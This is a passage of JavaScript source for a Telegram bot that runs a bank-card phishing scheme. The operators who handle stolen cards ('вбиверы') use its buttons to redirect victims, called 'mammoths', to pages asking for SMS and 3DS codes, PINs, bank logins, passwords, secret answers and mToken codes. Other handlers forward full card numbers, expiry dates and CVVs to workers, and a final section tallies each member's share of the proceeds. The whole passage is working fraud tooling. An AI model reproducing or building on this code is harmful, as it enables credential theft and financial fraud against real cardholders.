                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }]
                    ]
                }
            })
            
            await q.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `💳 Взял: ${q.from.username} 💳`, url: `https://t.me/${q.from.username}` }],
                    [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                ]
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })

            await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n💳 <b>Мамонт отправлен на ввод точного баланса</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })

            await logs.findOneAndUpdate({ link: id }, { $set: { method: 'lowmoney' } }, { new: true }).lean()
        })
    }

    if (data.includes('vbiv_limits')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На инфе о лимитах</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На инфе о лимитах', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n📉 <b>У мамонта лимиты на карте</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'limits' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_no3ds')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>Нету 3DS</i>`, { parse_mode: 'HTML' })
                
                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: Нету 3DS', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await q.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🔒 <b>У мамонта нет 3DS. Отправили на подключение</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, { parse_mode: 'HTML' }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'no3ds' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_lk')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе ЛК</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе ЛК', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🏦 <b>Мамонт направлен на ввод банк. аккаунта</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'lk' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_password')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе пароля</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе пароля', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n✏️ <b>Мамонт отправлен на ввод пароля для подтверждения транзакции</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await q.scene.enter('passwordALL')

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'password' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }


    if (data.includes('vbiv_key6')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе Key6</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе KEY6', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🔑 <b>Мамонт направлен на ввод Key6</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'key6' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_secretDE')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе секретки</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе секретки', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await bot.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🔑 <b>Мамонт направлен на ввод ответа на секретный вопрос</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💳 Написать вбиверу 💳', url: `https://t.me/${q.from.username}` }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await q.scene.enter('secretDE')

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'secretDE' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_mToken')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.telegram.sendMessage(config.bot.admin_logs, `⚡️ <b>Перенаправление мамонта</b>\n\n💡 ID: <code>${id}</code>\n💳 <b>Вбивер:</b> ${q.from.username}\n💳 <b>Действие:</b> <i>На вводе mToken</i>`, { parse_mode: 'HTML' })

                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: '⚙️ Статус: На вводе mToken', callback_data: 'statusssssssss' }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await q.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n🔑 <b>Мамонт направлен на ввод mToken</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, { parse_mode: 'HTML' }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await logs.findOneAndUpdate({ link: id }, { $set: { method: 'mToken' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    if (data.includes('vbiv_success')) {
        q.scene.enter('success')
    }

    if (data.includes('vbiv_leave')) {
        let id = data.split(' ')[1]

        let res_db = await receive.findOne({ link: id }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: id }).lean()

        await cards.findOne({ link: id }).lean().then(async (res) => {
            if ((!res) || (q.from.username == res.vbiver)) {
                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: `💳 Взять 💳`, callback_data: `vbiv_get ${id}` }],
                        [{ text: '💬 СМС', callback_data: `vbiv_3ds ${id}` }, { text: '📲 Push', callback_data: `vbiv_push ${id}` }],
                        [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${id}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${id}` }],
                        [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${id}` }, { text: '♻️ Другая карта', callback_data: `vbiv_change ${id}` }],
                        [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${id}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${id}` }],
                        [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${id}` }],
                        [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${id}` }, { text: '✏️ Password', callback_data: `vbiv_password ${id}` }],
                        [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${id}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${id}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${id}` }],
                        [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${id}` }],
                    ]
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await q.telegram.sendMessage(res_db.tgID, `🎆 <b>${res_db.service}:</b>\n<b>🙉 Вбивер отказался от вашего лога, он достанется другому вбиверу</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}\n📬 <b>Вбивер:</b> @${q.from.username}`, { parse_mode: 'HTML' }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                await cards.findOneAndUpdate({ link: id }, { $set: { vbiver: 'nothing' } }, { new: true }).lean()
            } else {
                await q.answerCbQuery(`Только @${res.vbiver} может управлять логом`, true)
            }
        })
    }

    /* ask vibvers to get log */
    if (data.includes('requestToLog')) {
        await q.replyWithHTML(`<b>🔔 Отправлен запрос на получение лога карты с ID ${data.split(' ')[1]}</b>`)

        let logInfo = await receive.findOne({ link: data.split(' ')[1] }).lean()
        if (!logInfo) logInfo = await bbc.findOne({ link: data.split(' ')[1] }).lean()
        
        let cardLog = await cards.findOne({ link: data.split(' ')[1] }).lean()
        await q.telegram.sendMessage(config.bot.request_logs, `🔔 <b>Новый запрос на выдачу лога!</b>\n\n🥷 <b>Воркер:</b> @${q.from.username} (${q.from.id})\n<b>🗃 Объявление:</b> <code>${(logInfo.product_name != undefined) ? logInfo.product_name : logInfo.city_from}</code>\n💸 <b>Стоимость:</b> <code>${(logInfo.product_price != undefined) ? logInfo.product_price : logInfo.price}</code>\n\n<b>💳 Номер карты:</b> ${cardLog.card_number}\n<b>💳 Дата:</b> ${cardLog.card_expiration}\n<b>💳 CVV:</b> ${cardLog.card_cvv}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💳 Выдать лог', callback_data: `okgetlog ${data.split(' ')[1]}` }],
                    [{ text: '🚫 Отклонить', callback_data: `noDontGetLog` }]
                ]
            }
        })
    } 
    
    if (data.includes('okgetlog')) {
        let logInfo = await receive.findOne({ link: data.split(' ')[1] }).lean()
        if (!logInfo) logInfo = await bbc.findOne({ link: data.split(' ')[1] }).lean()
        
        let cardLog = await cards.findOne({ link: data.split(' ')[1] }).lean()

        await q.telegram.sendMessage(logInfo.tgID, `🔔 <b>Вам был выдан лог!</b>\n\n<b>🗃 Объявление:</b> <code>${(logInfo.product_name != undefined) ? logInfo.product_name : logInfo.city_from}</code>\n💸 <b>Стоимость:</b> <code>${(logInfo.product_price != undefined) ? logInfo.product_price : logInfo.price}</code>\n\n<b>💳 Номер карты:</b> ${cardLog.card_number}\n<b>💳 Дата:</b> ${cardLog.card_expiration}\n<b>💳 CVV:</b> ${cardLog.card_cvv}`, { parse_mode: 'HTML' })
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: '✅ Лог отправлен', callback_data: '✅ Лог выдан' }]
            ]
        })
    } 
    
    if (data.includes('noDontGetLog')) {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: '🚫 Отказано', callback_data: '🚫 Отказано' }]
            ]
        })
    }

    /* delete message / fake profit */
    if (data == 'Фэйк_profittzz') {
        q.deleteMessage(q.update.callback_query.message.message_id).catch(async (err) => {
            loggy.warn(`cant delete message => ${err}`)
        })
    }

    if (data.includes('deleteSpam')) {
        await receive.findOneAndDelete({ link: data.split(' ')[1] }).then(async (res) => {
            if (res) {
                await q.telegram.sendMessage(res.tgID, `<b>❕ Ваша ссылка с ID</b> <code>${res.link}</code> <b>была удалена администрацией</b>`, { parse_mode: 'HTML' })
                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: 'Удалено', callback_data: 'Фэйк_profittzz' }]
                    ]
                })
           }
       })
    } 
    
    if (data.includes('deleteSpamBBC')) {
        await bbc.findOneAndDelete({ link: data.split(' ')[1] }).then(async (res) => {
            if (res) {
                await q.telegram.sendMessage(res.tgID, `<b>❕ Ваша ссылка с ID</b> <code>${res.link}</code> <b>была удалена администрацией</b>`, { parse_mode: 'HTML' })
                await q.editMessageReplyMarkup({
                    inline_keyboard: [
                        [{ text: 'Удалено', callback_data: 'Фэйк_profittzz' }]
                    ]
                })
           }
       })
    }

    /* pro worker panel */
    if (data == '🔥 Панель ПРО воркера') {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: 'Выбрать домен', callback_data: 'PRO Выбрать домен' }],
                [{ text: 'Установить свой домен', callback_data: `PRO Установить домен` }],
                [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
            ]
        })
    }

    if (data == 'PRO Выбрать домен') {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: '👨‍👩‍👦‍👦 Общий', callback_data: `PRO domain_Общий` }, { text: '👨‍👨‍👦 Приватный', callback_data: `PRO domain_priv8` }],
                [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
            ]
        })
    }

    if (data == 'PRO domain_Общий') {
        await account.findOneAndUpdate({ tgID: q.from.id }, { $set: { domainSelect: 'public' } }, { new: true }).lean().then(async (res) => {
            await q.answerCbQuery('🤖 Вы выбрали общий домен!', { show_alert: true })
        })
    }

    if (data == 'PRO domain_priv8') {
        await account.findOneAndUpdate({ tgID: q.from.id }, { $set: { domainSelect: 'private' } }, { new: true }).lean().then(async (res) => {
            await q.answerCbQuery('🤖 Вы выбрали приватный домен!', { show_alert: true })
        })
    }

    /* kassa for day (for admins) */
    if ((data.includes('ktoday_')) || (data.includes('kyest_')) || (data.includes('kdyest_'))) {
        q.answerCbQuery(`🤖 Отправляю статистику в канал бухгалтерии...`, { show_alert: true })
        
        let cassa_res = {
            raze: 0,
            krot: 0,
            moscow: 0,
            zam: 0,
            coder: 0,
            workers: 0,
            agattho: 0,
            focuss1488: 0,
            KREWAZZ: 0,
            pulseend: 0,
            koussol: 0,
            krabogrob: 0,
            mizzzzy: 0,
            xnx_scm: 0,
            koraabl: 0,
            nekrblat: 0
        }
        
        await cassa.find({ date: data.split('_')[1] }).lean().then(async (res) => {
            for (let i = 0; i < res.length; i++) {
                cassa_res.zam += parseInt(res[i].zam)
                cassa_res.coder += parseInt(res[i].coder)
                
                if (parseInt(res[i].sumToTake) != NaN) {
                    cassa_res.workers += parseInt(res[i].sumToTake)
                }
            }
    
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'h0wtogetm0ney') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.krot += parseInt(res[i].vbiver)
                    }
                }
            }
    
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'rzzzxxxxsss') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.raze += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'L1keK1ev') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.moscow += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'focuss1488') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.focuss1488 += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'KIIVAZ') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.KREWAZZ += parseInt(res[i].vbiver)
                    }
                }
